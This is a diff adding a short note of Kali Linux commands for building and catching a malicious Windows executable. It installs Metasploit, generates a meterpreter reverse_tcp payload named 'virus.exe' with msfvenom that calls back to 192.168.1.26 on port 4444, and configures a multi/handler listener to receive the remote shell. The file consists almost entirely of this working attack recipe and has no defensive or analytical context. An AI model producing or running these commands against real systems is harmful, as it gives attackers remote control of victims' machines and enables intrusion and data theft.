@@ -1,0 +1,26 @@
+Following the commands for configuring a Malicious Payload .exe on Kali Linux :
+
+sudo apt install metasploit-framework -y
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.26 LPORT=4444 -f exe -o virus.exe
+
+msfconsole
+
+use exploit/multi/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+Terminal: set lhost 192.168.1.26
+
+Terminal: set lport 4444
+
+Terminal: exploit
+
+
+
+
+
+
+
+
+
